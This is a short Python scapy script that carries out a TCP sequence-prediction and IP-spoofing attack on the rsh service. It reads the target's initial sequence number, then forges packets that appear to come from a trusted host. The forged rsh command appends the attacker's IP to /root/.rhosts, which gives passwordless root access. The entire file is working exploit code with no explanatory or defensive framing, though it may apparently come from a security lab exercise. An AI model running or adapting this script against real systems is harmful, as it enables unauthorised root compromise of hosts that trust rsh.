from scapy.all import *
import time
import sys

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    my_ip = get_if_addr(sys.argv[1])
    
    target_port = 514
    test_port = 1015
    my_port = 1023
    e_port = 1021
    offset = 64000
    ip= IP(src=my_ip,dst=target_ip)
    SYN=TCP(sport=test_port,dport = target_port,flags='S',seq =1001)
    rsp = sr1(ip/SYN,verbose=0)
    old_seq = rsp[TCP].seq
    #old_seq=960001
    print(old_seq)
    time.sleep(3)
    ip= IP(src=trusted_host_ip,dst=target_ip)
    SYN=TCP(sport=my_port,dport = target_port,flags='S',seq =1001)
    send(ip/SYN)
    time.sleep(10)
    ACK=TCP(sport=my_port,dport = target_port,flags='A',seq =1002,ack=old_seq + offset + 1)
    send(ip/ACK)
    time.sleep(10)
    #str(e_port) +
    data = '0\x00root\x00root\x00echo \'' + my_ip + ' root\' >> /root/.rhosts\x00'
    send(ip/ACK/data)
    #ACK=TCP(sport=e_port,dport = 1023,flags='SA',seq =1058,ack=old_seq + offset + offset2+1)
    #send(ip/ACK)